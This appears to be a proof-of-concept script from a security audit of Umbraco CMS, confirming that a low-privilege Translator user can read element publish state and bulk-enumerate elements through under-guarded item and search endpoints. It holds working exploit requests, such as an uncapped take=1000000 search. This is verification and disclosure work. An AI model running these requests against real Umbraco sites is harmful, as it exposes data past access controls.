#!/usr/bin/env python3
"""
VULN-048 — item/element[/search] is floor-only and its search take is uncapped → any backoffice
           user reads an element's publish State / IsTrashed / tree structure by GUID and
           bulk-enumerates the entire element set, bypassing per-node ElementPermissionByResource.

Vulnerable code (targets/Umbraco-CMS/src/Umbraco.Cms.Api.Management):
  * Controllers/Element/Item/ElementItemControllerBase.cs:12  — class ElementItemControllerBase
        : ManagementApiControllerBase   (floor only — no section policy)
  * Controllers/Element/Item/ItemElementItemController.cs      — GET item/element?id=  (by GUID)
  * Controllers/Element/Item/SearchElementItemController.cs:51 — Search(query, skip=0, take=100)
        via IEntitySearchService.Search(...); take is NEVER clamped
  * ViewModels/Element/Item/ElementItemResponseModel.cs        — leaks IsTrashed/Parent/HasChildren/
        DocumentType/Variants[].State + Variants[].Name
  * contrast — Controllers/Element/ByKeyElementController.cs:60 — AuthorizeResourceAsync(
        ElementPermissionResource.WithKeys(ActionElementBrowse, id), ElementPermissionByResource)
        under [Authorize(TreeAccessElements)] (= the Library section)

Class: Excessive data exposure / broken access control (item-endpoint invariant violation) — CWE-639, CWE-200.

Flaw (plain English):
  The real element read (ByKeyElementController) sits behind the Library section AND a per-node
  ElementPermissionByResource check (start-node isolation). The element *item* endpoints inherit only
  the base BackOfficeAccess floor and apply neither. So any authenticated backoffice user — including
  one with NO Library section at all (a Translator) — reads any element's publish state / trashed
  flag / tree position by GUID, and the search action leaves `take` uncapped, enabling a single
  request to dump the whole element set.

Exploitation idea:
  Admin creates an element (isElement + AllowedInLibrary type) with a random name. Provision a
  Translator (Translation section only). Prove the boundary is real: GET /element/{key} → 403.
  Then GET item/element?id={key} → 200 with the element's State/IsTrashed/name, and
  GET item/element/search?query=Secret&take=1000000 → 200 enumerating it (take not clamped).

A successful run proves: a backoffice user the element API rejects (403) reads element publish
state + tree metadata and bulk-enumerates elements through the floor-only item endpoints.
"""
import json
import os
import sys
import uuid

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import _common as c

VID = "VULN-048"
TRANSLATOR_KEY = "f2012e4c-d232-4bd1-8eae-4384032d97d8"   # default Translators group (Translation section only)


def create_element(admin, name, sfx):
    """Create an element-type (isElement + AllowedInLibrary) and an element instance at the library root."""
    et_id, prop_id = str(uuid.uuid4()), str(uuid.uuid4())
    et_payload = {
        "id": et_id, "alias": f"elemType{sfx}", "name": f"ElemType {sfx}", "description": None,
        "icon": "icon-document", "allowedAsRoot": True, "isElement": True, "allowedInLibrary": True,
        "variesByCulture": False, "variesBySegment": False, "collection": None,
        "properties": [{
            "id": prop_id, "container": None, "sortOrder": 0, "alias": "body", "name": "Body",
            "description": None, "dataType": {"id": c.TEXTSTRING_DATATYPE},
            "variesByCulture": False, "variesBySegment": False,
            "validation": {"mandatory": False, "mandatoryMessage": None, "regEx": None, "regExMessage": None},
            "appearance": {"labelOnTop": False}}],
        "containers": [], "allowedTemplates": [], "defaultTemplate": None,
        "cleanup": {"preventCleanup": False, "keepAllVersionsNewerThanDays": None, "keepLatestVersionPerDayForDays": None},
        "allowedDocumentTypes": [], "compositions": [], "parent": None,
    }
    r = admin.post("/document-type", json=et_payload)
    if r.status_code not in (200, 201):
        raise RuntimeError(f"create element-type failed: HTTP {r.status_code} {r.text[:300]}")
    el_id = str(uuid.uuid4())
    el_payload = {
        "id": el_id, "parent": None, "documentType": {"id": et_id}, "template": None,
        "values": [{"culture": None, "segment": None, "alias": "body", "value": "elem-secret"}],
        "variants": [{"culture": None, "segment": None, "name": name}],
    }
    r = admin.post("/element", json=el_payload)
    if r.status_code not in (200, 201):
        raise RuntimeError(f"create element failed: HTTP {r.status_code} {r.text[:300]}")
    return el_id


def main() -> int:
    c.banner(VID, "item/element[/search] floor-only + uncapped take → cross-section element leak/enumeration",
             "ElementItemControllerBase.cs:12 (floor only); SearchElementItemController.cs:51 (take uncapped)")

    # ---- SETUP (as admin): an element with a random name ----
    admin = c.admin_client()
    c.log("SETUP", "admin authenticated to Management API")
    sfx = c.rnd(4)
    elname = f"SecretElement_{sfx}"
    elkey = create_element(admin, elname, sfx)
    c.log("SETUP", f"created element {elname!r} (key={elkey}) via the Library-gated /element endpoint")

    # ---- provision a Translator (Translation section only, NO Library) ----
    pw = f"Trans_{c.rnd(6)}!aA1"
    u = c.create_user(admin, [TRANSLATOR_KEY])
    c.set_password_for_user(admin, u["id"], pw)
    trans = c.ApiClient(u["email"], pw, label="translator")
    sections = trans.get("/user/current").json().get("allowedSections", [])
    c.log("SETUP", f"created default Translator {u['email']}; allowedSections={sections}")
    if "Umb.Section.Library" in sections:
        c.log("FAIL", "Translator unexpectedly has the Library section — cannot establish the boundary")
        return c.verdict(VID, "FAILED", "test principal has Library access")
    c.log("INFO", "Translator holds NO Library section — the element-tree boundary is what we cross below")

    ok = True

    # ---- CONTRAST: the element boundary IS enforced on the real endpoint ----
    c.log("STEP", "baseline: GET /element/{key} via the real endpoint ([Authorize(TreeAccessElements)] + per-node)")
    r_norm = trans.get(f"/element/{elkey}")
    if r_norm.status_code == 403:
        c.log("PROOF", "GET /element/{key} → 403 Forbidden — the element API rejects this identity (as it should)")
    else:
        c.log("FAIL", f"GET /element/{{key}} returned {r_norm.status_code}, expected 403 — boundary not established")
        ok = False

    # ---- ATTACK 1: by-GUID item read leaks publish State / IsTrashed / tree metadata ----
    c.log("STEP", "attack: GET item/element?id={key} (floor-only item endpoint) — no section, no per-node check")
    r_item = trans.get(f"/item/element?id={elkey}")
    if r_item.status_code == 200 and elname in r_item.text:
        e0 = r_item.json()[0]
        v0 = e0.get("variants", [{}])[0]
        c.log("PROOF", f"item/element → 200 leaked auth-sensitive fields: name={v0.get('name')!r} "
                       f"state={v0.get('state')!r} isTrashed={e0.get('isTrashed')} "
                       f"documentType={e0.get('documentType',{}).get('id')}")
    else:
        c.log("FAIL", f"item/element status={r_item.status_code}; name present={elname in r_item.text}; "
                      f"body={r_item.text[:200]}")
        ok = False

    # ---- ATTACK 2: search with an absurd take proves the missing clamp + bulk enumeration ----
    c.log("STEP", "attack: GET item/element/search?query=Secret&take=1000000 — uncapped take = bulk enumeration")
    r_search = trans.get("/item/element/search?query=Secret&take=1000000")
    if r_search.status_code == 200 and r_search.json().get("total", 0) >= 1 and elname in r_search.text:
        total = r_search.json().get("total")
        names = [i.get("variants", [{}])[0].get("name") for i in r_search.json().get("items", [])]
        c.log("PROOF", f"item/element/search?take=1000000 → 200 (take NOT clamped), total={total}; "
                       f"enumerated element names include {names[:5]}")
        c.log("PROOF", "a Translator the element API 403s just enumerated the element set across the section boundary")
    else:
        c.log("FAIL", f"item/element/search status={r_search.status_code}; total={r_search.json().get('total') if r_search.status_code==200 else 'n/a'}")
        ok = False

    # persist the decisive request/response
    here = os.path.dirname(__file__)
    with open(os.path.join(here, "request.http"), "w") as f:
        f.write("# All requests sent as a default Translator (Translation section only, NO Library section)\n\n"
                f"# ATTACK — by-GUID element metadata read (floor-only item endpoint):\n"
                f"GET {c.MGMT}/item/element?id={elkey} HTTP/1.1\n"
                f"Authorization: Bearer <translator-token>\n\n"
                f"# ATTACK — bulk enumeration with an uncapped take:\n"
                f"GET {c.MGMT}/item/element/search?query=Secret&take=1000000 HTTP/1.1\n"
                f"Authorization: Bearer <translator-token>\n\n"
                f"# CONTRAST — same user, real element endpoint => 403:\n"
                f"GET {c.MGMT}/element/{elkey} HTTP/1.1\nAuthorization: Bearer <translator-token>\n")
    with open(os.path.join(here, "response.txt"), "w") as f:
        f.write(f"element created this run: {elname}  (key={elkey})\n")
        f.write(f"GET /element/{elkey}                    (real, section+per-node gated) -> {r_norm.status_code}\n")
        f.write(f"GET /item/element?id={elkey}            (floor-only item)              -> {r_item.status_code}\n")
        if r_item.status_code == 200:
            f.write(f"    leaked: {json.dumps(r_item.json(), indent=2)}\n")
        f.write(f"GET /item/element/search?query=Secret&take=1000000                     -> {r_search.status_code}, "
                f"total={r_search.json().get('total') if r_search.status_code==200 else 'n/a'} (take NOT clamped)\n")

    if ok:
        return c.verdict(VID, "CONFIRMED",
                         "Translator (403 on /element) read element State/IsTrashed and bulk-enumerated via item/element[/search]")
    return c.verdict(VID, "FAILED", "could not reproduce the item/element cross-section leak")


if __name__ == "__main__":
    sys.exit(main())
